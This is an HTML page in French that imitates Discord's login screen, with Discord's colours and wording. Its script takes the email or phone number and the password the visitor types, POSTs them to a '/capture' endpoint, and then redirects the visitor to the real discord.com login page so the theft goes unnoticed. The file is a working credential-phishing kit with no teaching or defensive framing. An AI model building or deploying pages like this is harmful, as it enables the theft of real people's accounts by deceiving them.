<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord | Connexion</title>
    <style>
        body {
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: #313338; /* Couleur de fond Discord */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background-color: #313338;
            padding: 32px;
            border-radius: 8px;
            width: 412px;
            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
            color: #B5BAC1;
            text-align: center;
        }

        h1 {
            color: white;
            font-size: 24px;
            margin-bottom: 8px;
            font-weight: 600;
        }

        .subtitle {
            margin-bottom: 20px;
            font-size: 16px;
        }

        .input-group {
            text-align: left;
            margin-bottom: 20px;
        }

        label {
            display: block;
            color: #B5BAC1;
            font-size: 12px;
            font-weight: bold;
            margin-bottom: 8px;
            text-transform: uppercase;
        }

        input {
            width: 100%;
            padding: 10px;
            background-color: #1E1F22;
            border: none;
            border-radius: 3px;
            color: #DBDEE1;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
        }

        .login-btn {
            width: 100%;
            padding: 12px;
            background-color: #5865F2; /* Blurple Discord */
            color: white;
            border: none;
            border-radius: 3px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .login-btn:hover {
            background-color: #4752C4;
        }

        .footer-text {
            text-align: left;
            font-size: 14px;
            margin-top: 4px;
        }

        .footer-text a {
            color: #00A8FC;
            text-decoration: none;
        }

        .footer-text a:hover {
            text-decoration: underline;
        }

        .register-text {
            margin-top: 20px;
            font-size: 14px;
            text-align: left;
        }
    </style>
</head>
<body>

<div class="login-container">
    <h1>Ha, vous revoilà !</h1>
    <p class="subtitle">Nous sommes ravis de vous revoir !</p>

    <form id="loginForm">
        <div class="input-group">
            <label>E-mail ou numéro de téléphone</label>
            <input type="text" required>
        </div>
        <div class="input-group">
            <label>Mot de passe</label>
            <input type="password" required>
            <div class="footer-text">
                <a href="#">Mot de passe oublié ?</a>
            </div>
        </div>
        
        <button type="submit" class="login-btn">Connexion</button>

        <div class="register-text">
            Besoin d'un compte ? <a href="#" style="color: #00A8FC; text-decoration: none;">S'inscrire</a>
        </div>
    </form>
</div>

<script>
    const loginForm = document.getElementById('loginForm');

    loginForm.addEventListener('submit', async function(event) {
        event.preventDefault();

        const username = event.target.querySelector('input[type="text"]').value;
        const password = event.target.querySelector('input[type="password"]').value;

        console.log("Tentative d'envoi vers Discord-Clone...");

        try {
            const response = await fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, password })
            });

            // Une fois que les logs sont reçus, on redirige vers le vrai Discord
            window.location.href = "https://discord.com/login";
        } catch (error) {
            console.error("Erreur d'envoi :", error);
        }
    });
</script>

</body>
</html>
